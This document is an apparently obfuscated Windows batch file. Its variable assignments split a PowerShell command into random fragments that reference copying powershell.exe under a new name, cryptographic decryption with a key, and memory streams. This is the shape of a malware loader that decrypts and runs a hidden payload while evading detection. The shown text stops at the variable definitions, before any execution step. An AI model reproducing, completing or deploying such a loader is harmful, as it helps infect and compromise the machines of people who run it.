@echo off
set "keqOJMaZog=co"
set "BXGYvQDJgh=Wi"
set "evoMVaeXvs=we"
set "PKDpFjJqrB=he"
set "aDyEqcpYTJ=po"
set "wnKRKlRwLW=ll"
set "fgjjNdMKQR=\W"
set "CQNtrpAZOW= C"
set "EYJNwrsqVT=py"
set "LqQmsEkPXA=s\"
set "jIEfwAMoNH=st"
set "FAujwgVUrj=em"
set "iYEadRLXTk=ll"
set "wMhJOuqXxu=nd"
set "GhweDYIpsA=rs"
set "venPALArOv=rS"
set "uaFtTtSZhL=xe"
set "fQWpXpXoYF=\v"
set "rhwKBzrkvs=ws"
set "mOMJVHIHxb=do"
set "sCRtcSgtar=.e"
set "rNFUVsxFts= /"
set "lblrlOkcoW=ow"
set "GgiGXwznLJ=0\"
set "TlnRYbKnrI=he"
set "gmEvhnSkmM=y "
set "jBaXIuiFSd=32"
set "ukdzrnzJcx=Po"
set "XzvzQruAof=we"
set "LRSGziIeSe=Sy"
set "VQNHyzFbAI=:\"
set "MhUHELlEAO=1."
set "SWbqUkwJjt=in"
set "TWJXlStJpE= %~dp0"
set "fUrCgqjXYo=cd"
set "GSgDbmUwjv=S46e"
set "HuXbQISLuQ=ptog"
set "pGtPIxBKbc=-1.."
set "wkHJCYxhDf=.Dis"
set "srBPFNrpel=PnwC"
set "PKzfMEmqYc=z.En"
set "ZfxPDLObGU=qYJ."
set "pgVlRaKciW=$DWQ"
set "xZLqVfBjjC=m.IO"
set "oNDXIHxmfB= '')"
set "wLuTCOeNQl=$DWQ"
set "KwACzKWtrC=] -j"
set "bBBIHUvkDV=Syst"
set "XTbTXNoDJL=mory"
set "eGuZwofOWr= = ["
set "mNbYpetGSB=tsWi"
set "WiQhxnRbjw=ptor"
set "yOsdcyrxQK=OyzA"
set "rCEWGFxjdp=embl"
set "CDxaWTmZJV=O.Me"
set "nuMymyArtw=[]] "
set "RpaEBgWScO=.Con"
set "LywCRwqxEY=Cnaf"
set "hCWTdcafbH=stem"
set "jYcmNwtSsh=stem"
set "ZTtQlbRHvz=oryS"
set "gbLuMcVIbo= [st"
set "igNTEvsPnj=jv.T"
set "LDtXWzSbGm=ress"
set "hBHYLSoVjS=y]::"
set "oXosXngXAg=();$"
set "vRpUyveFbi=raph"
set "EqOjrMFlxY= New"
set "hpLNcRzNfJ=KTsg"
set "hHZGkAqcas=oiAq"
set "IJvcINRgWG=woIw"
set "FkAXUVKIIh=3); "
set "wwpjQprJWg='gni"
set "JicaJIvUZF='dqR"
set "TMuDbkePFH=w, 0"
set "sgGAYMUtXJ=urit"
set "dizUwelKRm=7;$z"
set "jVzHjQcSnw=se()"
set "RSuPwyerKb=ecry"
set "bZVStWmxWX=esaB"
set "BYhMuNmSNw=$VXJ"
set "EsnxmViCkK= [Sy"
set "ErEbJBTLYj=Disp"
set "StEHdieBAb=Syst"
set "USWoVrOSWJ=7Yiv"
set "eptLgIQAmr=PKCS"
set "RGuGnmSklT= '')"
set "STMauZIhnW=ment"
set "qWCGlWpyUX=[IO."
set "zEicgDDBdh=lit("
set "bBJphhSIoZ=yste"
set "pwMdYmjjua=iron"
set "VTaJGZsvnp=F'[-"
set "puwUGdPiRz=.-16"
set "fxxigvPgMc=KTsg"
set "UZFQuPHRUU=tem."
set "qCAYPEpLxn=Fo7l"
set "qPUdtutQfX=ay()"
set "AaYgXvzIzf=l) {"
set "KOqeCZzQzP=XUfZ"
set "GOphUXdlWi=[Sys"
set "EJZWNSBkiw=d;$z"
set "veGOcNFPfs=raph"
set "kxAYGsvUlD=0O+g"
set "XCFBPhJSsk=Obje"
set "cHLRotBLoX=saBm"
set "qWlRlfeVKx=KTsg"
set "veJlURKkip=fore"
set "lUmiTMYVgG=+hAO"
set "SYMgMAkSeA=16] "
set "voPosxgISf=.Cop"
set "YdXqHOmQLi=  $K"
set "GXyQXQPmBl=pose"
set "ExsyCulPFi=n ''"
set "CtuSRdIBbF=and "
set "zWLXgqrkkP=yste"
set "HpEVfGFFzc=.Key"
